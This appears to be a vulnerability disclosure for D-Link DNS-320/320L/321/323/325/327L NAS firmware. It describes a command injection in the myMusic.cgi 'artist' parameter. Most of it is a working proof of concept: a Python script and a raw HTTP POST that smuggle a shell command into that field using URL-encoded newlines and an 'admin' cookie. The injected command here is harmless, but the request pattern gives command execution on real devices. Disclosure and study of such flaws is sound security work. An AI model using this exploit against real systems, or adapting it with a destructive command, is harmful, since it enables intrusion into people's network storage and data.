# Overview
Firmware download website:
 [https://ftp.dlink.ru/pub/NAS/](https://ftp.dlink.ru/pub/NAS/)
# Affected version
DLINK DNS-320/320L/321/323/325/327L all versions of the firmware
# Vulnerability details
The DLINK nas DNS-320/320L/321/323/325/327L  all firmware version has a command injection vulnerability in cgi_get_album_all_tracks function of the file /cgi-bin/myMusic.cgi.  The variable `artist`is passed from a POST request and is assigned to `v6` via the `snprintf` function at line 36 and invoked by the `popen` command, the SpecSymbol2BackSlash function did not work which leads to command execution. 

![image.png](https://cdn.nlark.com/yuque/0/2024/png/2771021/1723715021402-1ea27d3e-d763-4864-acab-367500dcb35b.png#averageHue=%23fdfdfa&clientId=u230a59ea-1997-4&from=paste&height=305&id=u11f267c9&originHeight=367&originWidth=822&originalType=binary&ratio=1&rotation=0&showTitle=false&size=58556&status=done&style=none&taskId=ue5cd0265-1ced-47a1-9045-602c89d7b11&title=&width=683)
# POC
```python
import requests

url = "http://192.168.0.32/cgi-bin/myMusic.cgi"
headers = {
    "Host": "192.168.0.32",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.0.32",
    "Connection": "close",
    "Referer": "http://192.168.0.32/photo_center/index.html",
    "Cookie": "username=admin",
    "Priority": "u=1"
}

data = "cmd=cgi_get_album_all_tracks&artist=%0atouch%09/tmp/117%0a&user=111&album=222"
response = requests.post(url, headers=headers, data=data)
print(response.text)

```

```
POST /cgi-bin/myMusic.cgi HTTP/1.1
Host: 192.168.0.32
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.0.32
Connection: close
Cookie: username=admin
Priority: u=1

cmd=cgi_get_album_all_tracks&artist=%0atouch%09/tmp/117%0a&user=111&album=222
```
